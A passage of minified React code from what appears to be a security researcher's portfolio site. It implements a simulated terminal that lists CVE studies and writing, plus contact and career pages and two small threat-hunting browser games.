r=Xl(s);return o.jsxs("div",{className:"fi",onClick:()=>t(a),children:[o.jsx("div",{className:"ic",children:s.title[0]}),o.jsx("div",{className:"ttl",children:s.title}),o.jsxs("div",{className:"sz",children:[r.code," · ",(s.tags||[])[0]||"—"]})]},s.title)})})]})}const eg=`  _   _ _____ __  __        ___  ____
 | | | | ____|  \\/  |      / _ \\/ ___|
 | |_| |  _| | |\\/| |____ | | | \\___ \\
 |  _  | |___| |  | |____|| |_| |___) |
 |_| |_|_____|_|  |_|       \\___/|____/`,Ti=["node-hunt","packet-intercept","malware-maze"],ng=["~","~/projects","~/writing","~/cves"],tg=["help","whoami","ls","cd","pwd","cves","cat","open","play","fortune","clear","exit"];function sg(e,n){if(!e||e==="~"||e==="/"||e==="/home/hem")return"~";if(e===".."){if(n==="~")return"~";const s=n.split("/");return s.pop(),s.join("/")||"~"}let t;return e.startsWith("~/")?t=e:e.startsWith("/home/hem/")?t="~/"+e.slice(10):t=n==="~"?`~/${e}`:`${n}/${e}`,t=t.replace(/\/$/,""),ng.includes(t)?t:null}function ag(e){return e==="~"?"about.txt  .now  manifesto.md  projects/  writing/  cves/":e==="~/projects"?Nn.map(n=>{var t;return((t=Ct[n.title])==null?void 0:t.code)||n.title.split(" ").map(s=>s[0]).join("").toUpperCase()}).join("  "):e==="~/writing"?me.map(n=>n.slug).join("  "):e==="~/cves"?kt.map(n=>n.id).join("  "):"(empty)"}function rg(e,n,t){var u;const s=[{type:"in",t:e,cwd:n}];let a=n,r=null,i=!1;const l=e.trim().split(/\s+/),c=l[0];if(c)if(c==="help")s.push({type:"em",t:"available: help, whoami, ls, cd, pwd, cves, cat <file>, open <app>, play <game>, fortune, clear, exit"},{type:"dm",t:"files: about.txt, .now, manifesto.md, cve <ID>"},{type:"dm",t:"dirs:  ~, ~/projects, ~/writing, ~/cves"},{type:"dm",t:"chain commands with && · Tab to complete"});else if(c==="whoami")s.push({type:"em",t:`${re.name} — ${re.role}`},{type:"dm",t:`${re.current} · ${re.location}`});else if(c==="ls")s.push({type:"em",t:ag(n)});else if(c==="pwd")s.push({type:"em",t:n==="~"?"/home/hem":`/home/hem/${n.slice(2)}`});else if(c==="cd"){const f=l[1],p=sg(f,n);p===null?(s.push({type:"bd",t:`cd: ${f}: no such directory`}),i=!0):(a=p,p!==n&&s.push({type:"dm",t:`→ ${p}`}))}else if(c==="cves")s.push({type:"em",t:"ID                 TARGET                  CLASS                  YEAR  ROLE"}),kt.forEach(f=>{s.push({type:"ln",t:`${f.id.padEnd(18)} ${(f.target||"").padEnd(23)} ${(f.class||"").padEnd(22)} ${f.year}  study`})});else if(c==="cat"){const f=l[1];if(!f)s.push({type:"bd",t:"cat: missing operand"}),i=!0;else if(f==="about.txt"||f==="about")s.push({type:"em",t:`${re.name} · ${re.role}
${re.current} · ${re.location}
`});else if(f===".now")Md.forEach(p=>s.push({type:"ln",t:`▸ ${p}`}));else if(f==="manifesto.md")ra.forEach(p=>s.push({type:"ln",t:`${p.k} ${p.v}`}));else if(f==="cve"){const p=l[2];if(!p)s.push({type:"bd",t:"cat: cve: missing CVE id"}),i=!0;else{const g=kt.find(v=>v.id.toLowerCase()===p.toLowerCase());g?s.push({type:"em",t:`${g.id}
  target: ${g.target}
  class:  ${g.class}
  year:   ${g.year}
  blog:   /blog/${g.slug}`}):(s.push({type:"bd",t:`cat: cve ${p}: not found`}),i=!0)}}else if(n==="~/projects"){const p=Nn.find(g=>{const v=Ct[g.title];return(v==null?void 0:v.code)&&v.code.toLowerCase()===f.toLowerCase()||g.title.toLowerCase()===f.toLowerCase()});if(p){const g=Ct[p.title]||{};s.push({type:"em",t:`${g.code||"—"} — ${p.title}`}),s.push({type:"dm",t:`${g.status||"—"} · ${(p.tags||[]).join(" / ")}`}),s.push({type:"ln",t:p.description}),g.metric&&s.push({type:"ln",t:`metric: ${g.metric}`}),(u=g.stack)!=null&&u.length&&s.push({type:"ln",t:`stack:  ${g.stack.join(", ")}`}),p.href&&p.href!=="#"&&s.push({type:"lk",t:p.href})}else s.push({type:"bd",t:`cat: ${f}: no such project`}),i=!0}else if(n==="~/writing"){const p=me.find(g=>g.slug.toLowerCase()===f.toLowerCase());p?(s.push({type:"em",t:p.title}),s.push({type:"dm",t:`${p.date} · ${p.readTime} · [${p.category}]`}),s.push({type:"ln",t:p.excerpt}),s.push({type:"dm",t:`// read: /blog/${p.slug}`})):(s.push({type:"bd",t:`cat: ${f}: no such writing`}),i=!0)}else if(n==="~/cves"){const p=kt.find(g=>g.id.toLowerCase()===f.toLowerCase());p?s.push({type:"em",t:`${p.id}
  target: ${p.target}
  class:  ${p.class}
  year:   ${p.year}
  blog:   /blog/${p.slug}`}):(s.push({type:"bd",t:`cat: ${f}: not found in cves/`}),i=!0)}else s.push({type:"bd",t:`cat: ${f}: No such file`}),i=!0}else if(c==="open"){const f=l[1];f&&xe[f]?(t.onLaunch&&t.onLaunch(f),s.push({type:"dm",t:`opening ${f}…`})):(s.push({type:"bd",t:`open: ${f||"(no app)"}: unknown app`}),i=!0)}else if(c==="play"){const f=l[1];f&&Ti.includes(f)?(t.onLaunch&&t.onLaunch("games",{initialGame:f}),s.push({type:"dm",t:`loading ${f}…`})):(s.push({type:"bd",t:`play: ${f||"(no game)"}: unknown. try: ${Ti.join(", ")}`}),i=!0)}else if(c==="fortune"){const f=ra[Math.floor(Math.random()*ra.length)];f&&s.push({type:"wn",t:`❝ ${f.v} ❞`})}else c==="clear"?r="clear":c==="exit"?r="exit":(s.push({type:"bd",t:`${c}: command not found`}),i=!0);return{out:s,newCwd:a,side:r,halt:i}}function ig(e,n){const t=/\s$/.test(e),s=e.trimEnd(),a=s.length?s.split(/\s+/):[],r=t?a.length:Math.max(0,a.length-1),i=t?"":a[a.length-1]||"",l=u=>(u||"").toLowerCase();if(r===0)return tg.filter(u=>u.startsWith(i));const c=a[0];if(c==="cd")return(n==="~"?["projects","writing","cves","..","~"]:["..","~"]).filter(f=>f.startsWith(i));if(c==="cat"){if(r===1){let u=[];return n==="~"?u=["about.txt",".now","manifesto.md","cve"]:n==="~/projects"?u=Nn.map(f=>{var p;return(p=Ct[f.title])==null?void 0:p.code}).filter(Boolean):n==="~/writing"?u=me.map(f=>f.slug):n==="~/cves"&&(u=kt.map(f=>f.id)),u.filter(f=>l(f).startsWith(l(i)))}return r===2&&a[1]==="cve"?kt.map(u=>u.id).filter(u=>l(u).startsWith(l(i))):[]}return c==="open"?Object.keys(xe).filter(u=>u.startsWith(i)):c==="play"?Ti.filter(u=>u.startsWith(i)):[]}function og(e){if(!e.length)return"";let n=e[0];for(let t=1;t<e.length;t++)for(;n&&!e[t].toLowerCase().startsWith(n.toLowerCase());)n=n.slice(0,-1);return n}function Ql(e,n){if(/\s$/.test(e))return e+n;const s=e.lastIndexOf(" ");return(s===-1?"":e.slice(0,s+1))+n}function Dd({runOnOpen:e,runOnOpenNonce:n,onLaunch:t}){const[s,a]=w.useState([{type:"ban",t:eg},{type:"dm",t:"HEM-OS 1.7.0 — type 'help' to begin."}]),[r,i]=w.useState(""),[l,c]=w.useState([]),[u,f]=w.useState(-1),[p,g]=w.useState("~"),v=w.useRef(null),k=w.useRef(null),y=w.useRef("");w.useEffect(()=>{v.current&&(v.current.scrollTop=v.current.scrollHeight)},[s]);const S=(d,h)=>{const x=d.split(/\s*&&\s*/).filter(I=>I.trim());let b=h,E=[],C=!1,A=!1;for(const I of x){const{out:j,newCwd:Z,side:we,halt:Le}=rg(I,b,{onLaunch:t});if(we==="clear"){C=!0,E=[],b=Z;continue}if(we==="exit"){A=!0;break}if(E.push(...j),b=Z,Le)break}if(A){window.dispatchEvent(new Event("hemos-close-term"));return}C?a(E):E.length&&a(I=>[...I,...E]),b!==h&&g(b)};w.useEffect(()=>{e&&S(e,p)},[e,n]);const m=d=>{if(d.key==="Enter")r.trim()&&(c(h=>[...h,r]),f(-1),y.current="",S(r,p)),i("");else if(d.key==="ArrowUp"){if(d.preventDefault(),l.length){u<0&&(y.current=r);const h=u<0?l.length-1:Math.max(0,u-1);f(h),i(l[h])}}else if(d.key==="ArrowDown"){if(d.preventDefault(),u>=0){const h=u+1;h>=l.length?(f(-1),i(y.current),y.current=""):(f(h),i(l[h]))}}else if(d.key==="Tab"){d.preventDefault();const h=ig(r,p);if(h.length===0)return;if(h.length===1){i(Ql(r,h[0]+" "));return}const x=/\s$/.test(r),b=r.lastIndexOf(" "),E=x?"":b===-1?r:r.slice(b+1),C=og(h);C.length>E.length&&i(Ql(r,C)),a(A=>[...A,{type:"dm",t:h.join("  ")}])}};return o.jsxs("div",{className:"at",ref:v,onClick:()=>k.current&&k.current.focus(),children:[s.map((d,h)=>d.type==="ban"?o.jsx("pre",{className:"ban",children:d.t},h):d.type==="in"?o.jsxs("div",{className:"ln",children:[o.jsxs("span",{className:"pp",children:["hem@hemos:",d.cwd||"~","$"]})," ",d.t]},h):o.jsx("div",{className:`ln ${d.type}`,children:d.t},h)),o.jsxs("div",{className:"il",children:[o.jsxs("span",{className:"pp",children:["hem@hemos:",p,"$"]}),o.jsx("input",{ref:k,className:"ip",autoFocus:!0,value:r,onChange:d=>i(d.target.value),onKeyDown:m,spellCheck:!1})]})]})}function zd(){return o.jsxs("div",{className:"atm",children:[o.jsx("h1",{children:"Career Trajectory"}),o.jsxs("div",{className:"sb",children:["// ",Gl.length," stops · ",Kl.length," certifications"]}),o.jsx("div",{className:"tl",children:Gl.map((e,n)=>{const t=e.range.toLowerCase().includes("present");return o.jsxs("div",{className:`stop ${t?"cur":""}`,children:[o.jsx("div",{className:"rg",children:e.range}),o.jsxs("div",{className:"ro",children:[e.role,t&&o.jsx("span",{className:"pil",children:"NOW"})]}),o.jsx("div",{className:"or",children:e.org}),o.jsx("div",{className:"bl",children:e.desc})]},n)})}),o.jsx("h2",{style:{fontFamily:"var(--mono)",fontSize:11,color:"var(--mut)",letterSpacing:".16em",textTransform:"uppercase",margin:"22px 0 10px"},children:"// CERTIFICATIONS"}),o.jsx("div",{className:"cg",children:Kl.map((e,n)=>o.jsxs("a",{className:"ce",href:e.href,target:"_blank",rel:"noreferrer",children:[o.jsx("div",{className:"t",children:e.title}),o.jsxs("div",{className:"m",children:[e.iss," · ",e.y]})]},n))})]})}function Fd(){return o.jsxs("div",{className:"am",children:[o.jsxs("div",{className:"sd",children:[o.jsx("div",{className:"gl",children:"Mailbox"}),o.jsxs("div",{className:"it on",children:["Inbox ",o.jsx("span",{className:"ct",children:"1"})]}),o.jsx("div",{className:"it",children:"Sent"}),o.jsx("div",{className:"gl",children:"Channels"}),Yl.map(e=>o.jsxs("a",{className:"it",href:e.href,target:"_blank",rel:"noreferrer",style:{textDecoration:"none"},children:[e.label,o.jsx("span",{className:"ct",children:e.handle})]},e.label))]}),o.jsxs("div",{className:"mn",children:[o.jsx("h1",{children:"Get in touch."}),o.jsx("div",{className:"fr",children:"From: hem@hemos · To: you@anywhere"}),o.jsxs("div",{className:"bd",children:[o.jsxs("p",{children:["Fastest path:"," ",o.jsx("a",{href:`mailto:${re.email}`,style:{color:"var(--acc2)"},children:re.email})]}),o.jsxs("p",{children:["I'm in ",re.location," (",re.tz,"). Open to: security research collabs, hiring conversations, paper reviews, and lab tours."]}),o.jsx("p",{style:{color:"var(--mut)",fontFamily:"var(--mono)",fontSize:12},children:"// PGP key on request. I read DMs eventually."})]}),o.jsx("div",{className:"sg",children:Yl.map(e=>o.jsxs("a",{href:e.href,target:"_blank",rel:"noreferrer",children:[o.jsx("span",{children:e.label}),o.jsxs("span",{children:[e.handle," →"]})]},e.label))})]})]})}function Bd(){const[e,n]=w.useState(0);w.useEffect(()=>{const a=setInterval(()=>n(r=>r+1),1500);return()=>clearInterval(a)},[]);const t=(a,r)=>Math.max(5,Math.min(95,a+Math.sin((e+r)*.6)*8)),s=[{label:"cpu / curiosity-d",base:72,off:0},{label:"mem / writing-cache",base:58,off:1},{label:"net / signal-strength",base:80,off:2},{label:"focus / shipping",base:64,off:3}];return o.jsxs("div",{className:"asy",children:[o.jsx("h1",{children:"system_monitor"}),o.jsx("div",{className:"sb",children:"// hem@hemos · uptime: stable since 2018"}),o.jsx("div",{className:"gg",children:s.map(a=>{const r=t(a.base,a.off);return o.jsxs("div",{className:"gu",children:[o.jsxs("div",{className:"l",children:[o.jsx("span",{children:a.label}),o.jsxs("span",{className:"v",children:[r.toFixed(0),"%"]})]}),o.jsx("div",{className:"br",children:o.jsx("div",{className:"f",style:{width:r+"%"}})})]},a.label)})}),o.jsx("h2",{children:"// processes / now"}),o.jsx("ul",{className:"nl",children:Md.map((a,r)=>o.jsx("li",{children:a},r))})]})}const Ge=5,Jl={easy:{scanLimit:3,hintThresholds:[1,3]},standard:{scanLimit:2,hintThresholds:[2,4]},hard:{scanLimit:1,hintThresholds:[3,5]}},ht=Array.from({length:Ge},(e,n)=>String.fromCharCode(65+n)),lg=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),Zl=()=>{const e={};for(let n=1;n<=Ge;n+=1)for(let t=0;t<Ge;t+=1){const s=`${ht[t]}${n}`;e[s]={status:"unknown",heat:""}}return e},cg=e=>{const s=(e||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(a=>a.length>4&&!lg.has(a));return s?s.toUpperCase():"SIGNAL"},ec=e=>{const n=e.length?e[Math.floor(Math.random()*e.length)]:{id:"UNKNOWN",title:"Unknown intruder",year:"Unknown",severity:"Unknown",summary:"",href:""},t=Math.floor(Math.random()*Ge),s=Math.floor(Math.random()*Ge);return{entry:n,colIndex:t,rowIndex:s,key:`${ht[t]}${s+1}`}},ug=e=>e===0?{label:"direct",text:"Direct signal. Confirm with ISOLATE."}:e<=1?{label:"hot",text:"Signal spike detected."}:e<=2?{label:"warm",text:"Signal is warm."}:e<=3?{label:"cool",text:"Signal is faint."}:{label:"cold",text:"Signal cold."},Sr=e=>[{type:"system",text:"NODE HUNT // Threat hunting console online."},{type:"system",text:"Type HELP to see commands."},{type:"info",text:`Grid ${Ge}x${Ge} loaded. Scan budget: ${e}.`}];function dg({entries:e=[],difficulty:n="standard"}){var X,q,T;const t=Jl[n]||Jl.standard,[s,a]=w.useState(()=>Zl()),[r,i]=w.useState(()=>ec(e)),[l,c]=w.useState(()=>Sr(t.scanLimit)),[u,f]=w.useState(""),[p,g]=w.useState(0),[v,k]=w.useState(0),[y,S]=w.useState(t.scanLimit),[m,d]=w.useState("active"),h=w.useRef(null),x=w.useMemo(()=>{var _,P,M,R;return{year:((_=r.entry)==null?void 0:_.year)||"Unknown",severity:((P=r.entry)==null?void 0:P.severity)||"Unknown",keyword:cg(`${((M=r.entry)==null?void 0:M.title)||""} ${((R=r.entry)==null?void 0:R.summary)||""}`)}},[r]);w.useEffect(()=>{h.current&&(h.current.scrollTop=h.current.scrollHeight)},[l]);const b=(_,P="info")=>{c(M=>[...M,{type:P,text:_}])},E=()=>{a(Zl()),i(ec(e)),g(0),k(0),S(t.scanLimit),d("active"),c([...Sr(t.scanLimit),{type:"system",text:"New hunt initialized."}])};w.useEffect(()=>{E()},[n]);const C=_=>{const P=_==null?void 0:_.toUpperCase().match(/^([A-Z])(\d+)$/);if(!P)return null;const M=P[1],R=Number(P[2]),F=ht.indexOf(M);return F===-1||!Number.isFinite(R)||R<1||R>Ge?null:{key:`${M}${R}`,colIndex:F,rowIndex:R-1}},A=_=>{const[P,M]=t.hintThresholds;v===0&&_>=P?(k(1),b(`Hint: Signal spikes in row ${r.rowIndex+1}.`,"hint")):v===1&&_>=M&&(k(2),b(`Hint: Signal concentrates in column ${ht[r.colIndex]}.`,"hint"))},I=()=>{if(y<=0){b("Scan budget depleted. Use PING or TRACE.","warning");return}S(M=>Math.max(M-1,0));const _=r.rowIndex<Ge/2?"NORTH":"SOUTH",P=r.colIndex<Ge/2?"WEST":"EAST";b(`Scan result: signal cluster in ${_}-${P} quadrant.`,"info")},j=_=>{const P=Math.abs(_.colIndex-r.colIndex)+Math.abs(_.rowIndex-r.rowIndex),M=ug(P);a(R=>({...R,[_.key]:{status:"ping",heat:M.label}})),b(`Ping ${_.key}: ${M.text}`,"info")},Z=_=>{const P=r.rowIndex===_.rowIndex?"SAME ROW":r.rowIndex<_.rowIndex?"NORTH":"SOUTH",M=r.colIndex===_.colIndex?"SAME COLUMN":r.colIndex<_.colIndex?"WEST":"EAST",R=P==="SAME ROW"&&M==="SAME COLUMN"?"LOCK POSSIBLE":P==="SAME ROW"?M:M==="SAME COLUMN"?P:`${P}-${M}`;a(F=>({...F,[_.key]:{status:"trace",heat:""}})),b(`Trace ${_.key}: target heading ${R}.`,"info")},we=_=>{var M;const P=p+1;if(g(P),_.key===r.key){a(R=>({...R,[_.key]:{status:"hit",heat:"hot"}})),d("found"),b(`Target isolated at ${_.key}.`,"success"),b(`Identity confirmed: ${((M=r.entry)==null?void 0:M.id)||"Unknown"}.`,"success");return}a(R=>({...R,[_.key]:{status:"miss",heat:"cold"}})),b(`Isolate ${_.key}: no match.`,"warning"),A(P)},Le=_=>{var Zn;const P=_.trim();if(!P)return;b(`> ${P}`,"command");const[M,R]=P.split(/\s+/),F=M.toLowerCase(),ke=R||"";if(m==="found"&&!["restart","help","clear","open"].includes(F)){b("Case closed. Type RESTART to hunt again.","system");return}if(F==="help"){b("Commands: SCAN, PING A1, TRACE B2, ISOLATE C3, OPEN, CLEAR, RESTART.","system");return}if(F==="scan"){I();return}if(F==="clear"){c([...Sr(t.scanLimit),{type:"system",text:"Console cleared."}]);return}if(F==="restart"){E();return}if(F==="open"){if(m!=="found"||!((Zn=r.entry)!=null&&Zn.href)){b("No report unlocked yet.","warning");return}window.open(r.entry.href,"_blank","noreferrer"),b("Opening report in new tab.","system");return}if(["ping","trace","isolate"].includes(F)){const Ie=C(ke);if(!Ie){b("Invalid coordinate. Example: PING B2.","error");return}F==="ping"&&j(Ie),F==="trace"&&Z(Ie),F==="isolate"&&we(Ie);return}b("Unknown command. Type HELP.","error")},O=_=>{_.preventDefault(),Le(u),f("")},U=_=>_.status==="hit"?"@":_.status==="miss"?"x":_.status==="trace"?"+":_.status==="ping"?"o":".";return o.jsxs("div",{className:"hunt-layout",children:[o.jsxs("div",{className:`hunt-terminal ${m==="found"?"win":""}`,children:[o.jsxs("div",{className:"terminal-header",children:[o.jsxs("div",{children:[o.jsx("div",{className:"terminal-title",children:"NODE HUNT"}),o.jsx("div",{className:"terminal-subtitle",children:"Threat hunting simulation"})]}),o.jsx("div",{className:`terminal-status ${m}`,children:m==="found"?"SECURED":"ACTIVE"})]}),o.jsxs("div",{className:"hunt-onboarding",children:[o.jsx("div",{className:"onboarding-title",children:"How to play"}),o.jsxs("div",{className:"onboarding-steps",children:[o.jsxs("div",{children:["1. SCAN (",t.scanLimit,"x) to get the quadrant."]}),o.jsx("div",{children:"2. PING A1 for heat distance."}),o.jsx("div",{children:"3. TRACE B2 for direction."}),o.jsx("div",{children:"4. ISOLATE when you are confident."})]}),o.jsx("div",{className:"onboarding-hint",children:"Try: SCAN, PING B2, TRACE C4, ISOLATE D5."})]}),o.jsx("div",{className:"terminal-log",ref:h,children:l.map((_,P)=>o.jsx("div",{className:`terminal-line ${_.type}`,children:_.text},`${_.type}-${P}`))}),o.jsxs("form",{className:"terminal-input",onSubmit:O,children:[o.jsx("span",{className:"terminal-prompt",children:"nodehunt>"}),o.jsx("input",{type:"text",value:u,onChange:_=>f(_.target.value),placeholder:"Type a command (HELP)","aria-label":"Terminal command"}),o.jsx("button",{className:"pill",type:"submit",children:"Run"})]})]}),o.jsxs("div",{className:`hunt-board ${m==="found"?"win":""}`,children:[o.jsxs("div",{className:"hunt-intel",children:[o.jsx("div",{className:"intel-title",children:"Signal fingerprint"}),o.jsxs("div",{className:"intel-row",children:[o.jsx("span",{children:"Year"}),o.jsx("span",{children:x.year})]}),o.jsxs("div",{className:"intel-row",children:[o.jsx("span",{children:"Severity"}),o.jsx("span",{children:x.severity})]}),o.jsxs("div",{className:"intel-row",children:[o.jsx("span",{children:"Codename"}),o.jsx("span",{children:x.keyword})]}),o.jsxs("div",{className:"intel-row",children:[o.jsx("span",{children:"Attempts"}),o.jsx("span",{children:p})]}),o.jsxs("div",{className:"intel-row",children:[o.jsx("span",{children:"Scans left"}),o.jsx("span",{children:y})]})]}),o.jsxs("div",{className:"hunt-grid",children:[o.jsxs("div",{className:"grid-row",children:[o.jsx("div",{className:"grid-cell header"}),ht.map(_=>o.jsx("div",{className:"grid-cell header",children:_},_))]}),Array.from({length:Ge}).map((_,P)=>o.jsxs("div",{className:"grid-row",children:[o.jsx("div",{className:"grid-cell header",children:P+1}),ht.map(M=>{const R=`${M}${P+1}`,F=s[R],ke=F.heat?`heat-${F.heat}`:"";return o.jsx("div",{className:`grid-cell cell ${F.status} ${ke}`,children:U(F)},R)})]},`row-${P}`))]}),o.jsxs("div",{className:"hunt-legend",children:[o.jsxs("div",{children:[o.jsx("span",{className:"legend-symbol",children:"."})," unknown"]}),o.jsxs("div",{children:[o.jsx("span",{className:"legend-symbol",children:"o"})," ping"]}),o.jsxs("div",{children:[o.jsx("span",{className:"legend-symbol",children:"+"})," trace"]}),o.jsxs("div",{children:[o.jsx("span",{className:"legend-symbol",children:"x"})," miss"]}),o.jsxs("div",{children:[o.jsx("span",{className:"legend-symbol",children:"@"})," capture"]})]}),m==="found"&&o.jsxs("div",{className:"hunt-result",children:[o.jsx("div",{className:"hunt-result-title",children:"Intruder identified"}),o.jsx("div",{className:"hunt-result-id",children:((X=r.entry)==null?void 0:X.id)||"Unknown"}),o.jsx("p",{className:"hunt-result-text",children:(q=r.entry)==null?void 0:q.title}),((T=r.entry)==null?void 0:T.href)&&o.jsx("a",{className:"button primary",href:r.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]})]})}const sn=["Alpha","Bravo","Charlie"],nc={easy:{scanBase:3,scanAfterMiss:2,missPenaltyAt:3,captureGoal:2},standard:{scanBase:2,scanAfterMiss:1,missPenaltyAt:2,captureGoal:3},hard:{scanBase:2,scanAfterMiss:1,missPenaltyAt:1,captureGoal:4}},pg=e=>nc[e]||nc.standard,Ws=(e,n)=>e>=n.missPenaltyAt?n.scanAfterMiss:n.scanBase,_r=e=>e.length?e[Math.floor(Math.random()*e.length)]:{id:"UNKNOWN",title:"Unknown packet stream",year:"Unknown",severity:"Unknown",summary:"",href:""},Tr=e=>{const t=(((e==null?void 0:e.id)||(e==null?void 0:e.title)||"").match(/\d/g)||[]).reduce((s,a)=>s+Number(a),0);return Number.isFinite(t)?t%10:Math.floor(Math.random()*10)},Bt=(e,n)=>Math.floor(Math.random()*(n-e+1))+e,Vs=e=>{const n=Math.floor(Math.random()*sn.length);return{packets:sn.map((s,a)=>{const r=a===n?e:Bt(0,9),i=a===n?Bt(70,96):Bt(25,75);return{lane:s,checksum:r===e&&a!==n?(r+1)%10:r,latency:Bt(18,90),burst:Bt(2,9),risk:i}}),maliciousLane:n}},Er=e=>[{type:"system",text:"PACKET INTERCEPT // Traffic control engaged."},{type:"system",text:"Inspect lanes, then intercept the hostile payload."},{type:"info",text:`Scan budget: ${e.scanBase} per round. Misses drop it to ${e.scanAfterMiss}.`}];function hg({entries:e=[],difficulty:n="standard"}){const t=pg(n),[s,a]=w.useState(()=>_r(e)),[r,i]=w.useState(()=>Tr(s)),[l,c]=w.useState(()=>Vs(r)),[u,f]=w.useState(()=>sn.map(()=>!1)),[p,g]=w.useState(0),[v,k]=w.useState(0),[y,S]=w.useState(()=>Ws(0,t)),[m,d]=w.useState("active"),[h,x]=w.useState(()=>Er(t)),[b,E]=w.useState(null),C=w.useRef(null),A=w.useMemo(()=>({year:(s==null?void 0:s.year)||"Unknown",severity:(s==null?void 0:s.severity)||"Unknown",signature:r}),[s,r]);w.useEffect(()=>{C.current&&(C.current.scrollTop=C.current.scrollHeight)},[h]),w.useEffect(()=>{if(!e.length)return;const O=_r(e),U=Tr(O);a(O),i(U),c(Vs(U)),f(sn.map(()=>!1)),g(0),k(0),S(Ws(0,t)),E(null),d("active"),x([...Er(t),{type:"system",text:"New traffic signature loaded."}])},[e,n]);const I=(O,U="info")=>{x(X=>[...X,{type:U,text:O}])},j=(O=v)=>{c(Vs(r)),f(sn.map(()=>!1)),S(Ws(O,t)),E(null)},Z=()=>{const O=_r(e),U=Tr(O);a(O),i(U),c(Vs(U)),f(sn.map(()=>!1)),g(0),k(0),S(Ws(0,t)),E(null),d("active"),x([...Er(t),{type:"system",text:"New case file opened."}])},we=O=>{if(m!=="found"&&!u[O]){if(y<=0){I("Scan budget exhausted. Intercept to continue.","warning");return}f(U=>U.map((X,q)=>q===O?!0:X)),S(U=>U-1),I(`Scan lane ${sn[O].toUpperCase()}: checksum surfaced.`,"info")}},Le=O=>{if(m==="found")return;const U=O===l.maliciousLane;if(E({lane:O,hit:U}),U){const X=p+1;if(g(X),I(`Intercept success on ${sn[O].toUpperCase()}.`,"success"),X>=t.captureGoal){d("found"),I("Threat chain neutralized.","success");return}j(v)}else{const X=v+1;k(X),I(`False positive on ${sn[O].toUpperCase()}.`,"warning"),j(X)}};return o.jsxs("div",{className:"intercept-layout",children:[o.jsxs("div",{className:"intercept-panel",children:[o.jsxs("div",{className:"intercept-header",children:[o.jsxs("div",{children:[o.jsx("div",{className:"intercept-title",children:"Packet Intercept"}),o.jsx("div",{className:"intercept-subtitle",children:"Scan lanes, then trigger quarantine."})]}),o.jsx("div",{className:`intercept-status ${m}`,children:m==="found"?"SECURED":"ACTIVE"})]}),o.jsxs("div",{className:"intercept-intel",children:[o.jsxs("div",{className:"intercept-intel-row",children:[o.jsx("span",{children:"Signature"}),o.jsx("span",{children:A.signature})]}),o.jsxs("div",{className:"intercept-intel-row",children:[o.jsx("span",{children:"Year"}),o.jsx("span",{children:A.year})]}),o.jsxs("div",{className:"intercept-intel-row",children:[o.jsx("span",{children:"Severity"}),o.jsx("span",{children:A.severity})]}),o.jsxs("div",{className:"intercept-intel-row",children:[o.jsx("span",{children:"Captures"}),o.jsxs("span",{children:[p,"/",t.captureGoal]})]}),o.jsxs("div",{className:"intercept-intel-row",children:[o.jsx("span",{children:"Misses"}),o.jsx("span",{children:v})]}),o.jsxs("div",{className:"intercept-intel-row",children:[o.jsx("span",{children:"Scans left"}),o.jsx("span",{children:y})]})]}),o.jsx("div",{className:"intercept-hint",children:"Match the checksum to the signature. Scan reveals lane data."}),o.jsxs("div",{className:"intercept-actions",children:[o.jsx("button",{className:"pill",type:"button",onClick:j,children:"New packet"}),o.jsx("button",{className:"pill",type:"button",onClick:Z,children:"New case"}),m==="found"&&(s==null?void 0:s.href)&&o.jsx("a",{className:"button primary",href:s.href,target:"_blank",rel:"noreferrer",children:"Open report"})]}),o.jsx("div",{className:"intercept-log",ref:C,children:h.map((O,U)=>o.jsx("div",{className:`intercept-line ${O.type}`,children:O.text},`${O.type}-${U}`))}),m==="found"&&o.jsxs("div",{className:"intercept-result",children:[o.jsx("div",{className:"intercept-result-title",children:"Threat captured"}),o.jsx("div",{className:"intercept-result-id",children:(s==null?void 0:s.id)||"Unknown"}),o.jsx("div",{className:"intercept-result-text",children:s==null?void 0:s.title})]})]}),o.jsx("div",{className:`intercept-stage ${m==="found"?"win":""}`,children:o.jsx("div",{className:"lane-grid",children:l.packets.map((O,U)=>{const X=u[U],q=(b==null?void 0:b.lane)===U?b.hit?"hit":"miss":"";return o.jsxs("div",{className:`lane-card ${X?"inspected":""} ${q}`,children:[o.jsxs("div",{className:"lane-header",children:[o.jsx("div",{className:"lane-title",children:O.lane}),o.jsxs("div",{className:"lane-risk",children:[o.jsx("span",{children:"Risk"}),o.jsx("span",{children:O.risk})]})]}),o.jsx("div",{className:"lane-stream",children:Array.from({length:3}).map((T,_)=>o.jsx("span",{className:"lane-packet",style:{animationDelay:`${_*.6}s`}},`${O.lane}-flow-${_}`))}),o.jsx("div",{className:"lane-body",children:X?o.jsxs("div",{className:"lane-metrics",children:[o.jsxs("div",{children:["checksum: ",O.checksum]}),o.jsxs("div",{children:["latency: ",O.latency,"ms"]}),o.jsxs("div",{children:["burst: ",O.burst]})]}):o.jsx("div",{className:"lane-encrypted",children:"Encrypted payload"})}),o.jsxs("div",{className:"lane-actions",children:[o.jsx("button",{type:"button",onClick:()=>we(U),children:"Scan"}),o.jsx("button",{type:"button",onClick:()=>Le(U),children:"Intercept"})]})]},O.lane)})})})]})}const Ve=5,tc={easy:{maxWalls:5,scanCharges:4,probeCharges:3},standard:{maxWalls:7,scanCharges:3,probeCharges:2},hard:{maxWalls:9,scanCharges:2,probeCharges:1}},fg=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),mg=e=>{const s=(e||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(a=>a.length>4&&!fg.has(a));return s?s.toUpperCase():"VECTOR"},gg=e=>e.length?e[Math.floor(Math.random()*e.length)]:{id:"UNKNOWN",title:"Unknown cluster",year:"Unknown",severity:"Unknown",summary:"",href:""},qe=(e,n)=>`${e}-${n}`,Ei=(e,n)=>e>=0&&n>=0&&e<Ve&&n<Ve,Ud=(e,n)=>[{row:e-1,col:n},{row:e+1,col:n},{row:e,col:n-1},{row:e,col:n+1}],yg=(e,n,t)=>{const s=[e],a=new Set([qe(e.row,e.col)]);for(;s.length;){const r=s.shift();if(r.row===n.row&&r.col===n.col)return!0;Ud(r.row,r.col).forEach(i=>{const l=qe(i.row,i.col);Ei(i.row,i.col)&&(t.has(l)||a.has(l)||(a.add(l),s.push(i)))})}return!1},Lr=(e,n)=>{const 